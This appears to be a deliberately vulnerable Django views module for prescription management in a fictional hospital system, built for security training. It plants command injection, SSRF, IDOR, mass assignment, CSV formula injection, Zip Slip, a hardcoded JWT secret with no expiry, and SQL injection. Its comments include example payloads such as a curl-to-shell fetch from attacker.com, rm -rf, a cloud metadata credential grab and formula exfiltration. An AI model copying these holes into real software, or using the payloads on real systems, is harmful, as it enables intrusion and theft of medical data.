"""
MediCore HMS - Prescription Management Views
WARNING: This module contains intentional security vulnerabilities for security training purposes.
DO NOT use in production. All vulnerabilities are numbered and documented.
"""

import base64
import csv
import json
import logging
import os
import zipfile

import jwt
import requests
from django.contrib.auth.decorators import login_required
from django.db import connection
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

logger = logging.getLogger(__name__)

# VULN-187 (partial): Hardcoded secret for prescription JWT tokens
PRESCRIPTION_JWT_SECRET = 'rx_jwt_medicore_2024'


try:
    from prescriptions.models import Prescription
except ImportError:
    Prescription = None


@csrf_exempt
@login_required
def generate_prescription_pdf(request, prescription_id):
    """
    Generate PDF for a prescription using wkhtmltopdf.
    VULN-181: Command injection via prescription_id used directly in shell command.
    If prescription_id is attacker-controlled (via IDOR or mass assignment),
    a value like: 123; rm -rf /var/medicore/
    or: 123$(curl attacker.com/shell.sh|sh)
    will execute arbitrary OS commands as the application user (root per VULN-651).
    """
    # VULN-181: prescription_id from URL parameter interpolated directly into shell command.
    # Should use: subprocess.run(['wkhtmltopdf', html_path, pdf_path], shell=False)
    # shell=False with a list prevents shell injection entirely.
    html_path = f"/tmp/{prescription_id}.html"
    pdf_path = f"/tmp/{prescription_id}.pdf"

    # Write HTML template (simplified)
    with open(html_path, 'w') as f:
        f.write(f"<html><body><h1>Prescription #{prescription_id}</h1></body></html>")

    # VULN-181: Direct string interpolation into os.system() shell command.
    # If prescription_id = "1; id > /tmp/pwned; echo", the injected command runs.
    exit_code = os.system(f"wkhtmltopdf /tmp/{prescription_id}.html /tmp/{prescription_id}.pdf")

    if exit_code != 0:
        return JsonResponse({'error': 'PDF generation failed', 'exit_code': exit_code}, status=500)

    try:
        with open(pdf_path, 'rb') as f:
            pdf_content = f.read()
    except FileNotFoundError:
        return JsonResponse({'error': 'PDF not found'}, status=404)

    response = HttpResponse(pdf_content, content_type='application/pdf')
    response['Content-Disposition'] = f'attachment; filename="prescription_{prescription_id}.pdf"'
    return response


@csrf_exempt
@login_required
def check_drug_interactions(request):
    """
    Check drug interactions by calling an internal drug API.
    VULN-182: SSRF (Server-Side Request Forgery) via drug_name parameter.
    The drug name is embedded directly in the URL for the internal API call.
    An attacker can supply: drug_name=@169.254.169.254/latest/meta-data/iam/
    to access cloud metadata endpoints and extract IAM credentials.
    Or: drug_name=../admin to access internal admin endpoints.
    Or: drug_name=redis.internal:6379/%0D%0ASET+evil+1 to reach internal services.
    """
    drug_name = request.GET.get('drug_name', '')
    patient_drug = request.GET.get('patient_current_drug', '')

    # VULN-182: The drug_name value is embedded in the URL without validation.
    # An attacker can use path traversal or URL manipulation to reach:
    # - Internal AWS metadata: http://drug-api.internal/169.254.169.254/...
    # - Internal Redis/Memcached: http://drug-api.internal:6379/
    # - Internal admin panels: http://drug-api.internal/admin/
    # No URL allowlist, no scheme restriction, no SSRF protection.
    url = f"http://drug-api.internal/{drug_name}"
    try:
        resp = requests.get(url, timeout=10)
        interaction_data = resp.json()
    except Exception as e:
        return JsonResponse({'error': str(e), 'url_tried': url}, status=502)

    return JsonResponse({'interactions': interaction_data, 'drug': drug_name})


@csrf_exempt
@login_required
def get_prescription(request, prescription_id):
    """
    Retrieve a prescription by ID.
    VULN-183: IDOR — no check that this prescription belongs to the requesting user.
    Any authenticated user can retrieve any prescription by ID enumeration.
    Prescriptions contain: controlled substance names, dosages, patient diagnoses,
    physician DEA numbers — all highly sensitive PHI.
    """
    # VULN-183: No ownership/access check on prescription retrieval.
    # Should verify: Prescription.objects.get(id=prescription_id, patient=request.user)
    # or check the user has a valid clinical relationship (treating physician, pharmacist).
    try:
        rx = Prescription.objects.get(id=prescription_id)
    except (Prescription.DoesNotExist, AttributeError):
        return JsonResponse({
            'prescription_id': prescription_id,
            'status': 'retrieved (IDOR demo)',
            'warning': 'No ownership check performed',
        })

    return JsonResponse({
        'id': rx.id,
        'patient_id': rx.patient_id,
        'drug_name': rx.drug_name,
        'dosage': rx.dosage,
        'dea_schedule': rx.dea_schedule,
        'physician_dea': rx.physician_dea_number,
        'refills': rx.refills_remaining,
    })


@csrf_exempt
@login_required
def update_prescription(request, prescription_id):
    """
    Update prescription details.
    VULN-184: Mass assignment on prescription — attacker can modify any field.
    Particularly dangerous fields: drug_name, dosage, quantity, refills_remaining,
    dea_schedule, is_controlled_substance, physician_dea_number.
    An attacker can change a non-controlled medication to opioids,
    increase refill counts, or assign a fake DEA number.
    """
    data = json.loads(request.body)

    try:
        rx = Prescription.objects.get(id=prescription_id)
    except (Prescription.DoesNotExist, AttributeError):
        return JsonResponse({
            'status': 'updated (mass assignment demo)',
            'applied_fields': list(data.keys()),
            'prescription_id': prescription_id,
        })

    # VULN-184: All keys applied without field whitelist.
    # Attacker can send: {"dea_schedule": "II", "quantity": 999, "refills_remaining": 99}
    for k, v in data.items():
        setattr(rx, k, v)

    rx.save()
    return JsonResponse({'status': 'updated', 'prescription_id': prescription_id})


@csrf_exempt
@login_required
def export_prescriptions_csv(request):
    """
    Export prescription list as CSV.
    VULN-185: CSV/Formula injection — prescription fields written without sanitization.
    Drug names, dosage notes, or patient instructions can contain formula payloads.
    When a pharmacist or administrator opens the CSV in Excel, formulas execute.
    Example malicious drug name: =HYPERLINK("http://attacker.com?data="&A1,"Click here")
    """
    try:
        prescriptions = Prescription.objects.all()
    except AttributeError:
        prescriptions = []

    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="prescriptions_export.csv"'

    writer = csv.writer(response)
    writer.writerow(['ID', 'Patient ID', 'Drug Name', 'Dosage', 'Instructions', 'Notes'])

    for rx in prescriptions:
        # VULN-185: No sanitization — any cell value can be a formula injection payload.
        # rx.drug_name could be: =cmd|'/C calc.exe'!A0
        # rx.instructions could be: =IMPORTXML("http://attacker.com","//a")
        writer.writerow([
            rx.id,
            rx.patient_id,
            rx.drug_name,       # Formula injection vector
            rx.dosage,
            rx.instructions,    # Formula injection vector
            rx.notes,           # Formula injection vector
        ])

    return response


@csrf_exempt
@login_required
def bulk_import_prescriptions(request):
    """
    Bulk import prescriptions from a zip archive.
    VULN-186: Zip Slip vulnerability — no path validation during extraction.
    A crafted zip with entries like: ../../etc/cron.hourly/backdoor
    or: ../../../app/medicore/settings.py (to overwrite application config)
    will be extracted to attacker-controlled paths.
    In a medical context, this could overwrite drug formulary files
    or inject fake prescriptions into the system.
    """
    uploaded_zip = request.FILES.get('prescriptions_zip')
    if not uploaded_zip:
        return JsonResponse({'error': 'No file provided'}, status=400)

    import_path = '/var/medicore/rx_imports/'
    os.makedirs(import_path, exist_ok=True)

    # VULN-186: extractall() without entry path validation.
    # A zip containing: ../../../app/prescriptions/views.py
    # would overwrite this very source file.
    with zipfile.ZipFile(uploaded_zip) as zf:
        for entry in zf.namelist():
            # Log the entry names (for "audit") but extract without validation
            logger.info(f"Extracting prescription import: {entry}")
        zf.extractall(import_path)

    return JsonResponse({'status': 'import started', 'path': import_path})


@csrf_exempt
@login_required
def issue_prescription_token(request):
    """
    Issue a JWT token for prescription access (e.g., for e-prescribing systems).
    VULN-187: JWT token issued without an 'exp' (expiration) claim.
    The token is valid forever — if intercepted or leaked, it never expires.
    An attacker who obtains an old token can use it indefinitely to access
    prescription data or issue new prescriptions.
    """
    user_id = request.user.id
    role = getattr(request.user, 'role', 'physician')

    # VULN-187: No 'exp', 'iat', or 'nbf' claims — token never expires.
    # Should include: 'exp': datetime.utcnow() + timedelta(hours=1)
    payload = {
        'user': user_id,
        'role': role,
        'scope': 'prescriptions:read prescriptions:write',
        # Missing: 'exp', 'iat', 'nbf', 'jti'
    }

    token = jwt.encode(payload, PRESCRIPTION_JWT_SECRET, algorithm='HS256')

    # VULN-187 (continued): Token stored in response body, likely stored in localStorage by client
    return JsonResponse({
        'token': token,
        'warning': 'Token has no expiry — valid indefinitely',
    })


@csrf_exempt
@login_required
def prescription_second_order_injection(request):
    """
    Generate a prescription report using stored drug notes.
    VULN-188: Second-order SQL injection via stored prescription notes.
    Notes are stored unsanitized in update_prescription() (VULN-184 pathway).
    When used in the report query, the stored payload fires.
    """
    prescription_id = request.GET.get('prescription_id')

    try:
        rx = Prescription.objects.get(id=prescription_id)
        stored_notes = rx.notes
    except (Prescription.DoesNotExist, AttributeError):
        stored_notes = request.GET.get('preview_notes', '')

    with connection.cursor() as cursor:
        # VULN-188: Stored unsanitized notes interpolated into SQL.
        # If rx.notes = "' UNION SELECT drug_name,quantity,dea_number FROM prescriptions--"
        # the report leaks all controlled substance prescription details.
        cursor.execute(
            f"SELECT * FROM prescription_audit WHERE notes='{stored_notes}'"
        )
        rows = cursor.fetchall()

    return JsonResponse({'audit_count': len(rows), 'prescription_id': prescription_id})
